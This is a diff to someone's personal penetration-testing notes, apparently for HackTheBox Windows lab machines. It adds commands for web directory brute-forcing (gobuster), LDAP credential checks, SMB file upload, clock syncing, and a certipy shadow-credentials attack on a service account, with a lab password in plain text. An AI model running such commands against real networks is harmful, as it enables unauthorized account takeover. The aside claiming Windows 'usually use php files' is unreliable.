@@ -7,6 +7,12 @@ Ports to pay attention:
 normally you will get some creds for win machines.
 You should try them to find what they are for
 
+
+enumeration:
+
+gobuster dir -u "http://name.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/dire....txt -t 100 -x php (windows usually use php files)
+
+
 1) netexec ldap <targetIP> -u <username> -p <password>
 and you will get smb and ldap confirmation
 
@@ -71,6 +77,7 @@ if this doesnt stay try: faketime
 and
 smbclient //targetip/IT -U <name>%<password> -c "put <filename>"    to upload a file at smb with write prev
 
+ntpdate -u "ip"
 
 faketime '2025-05-27 20:41:00' certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
 
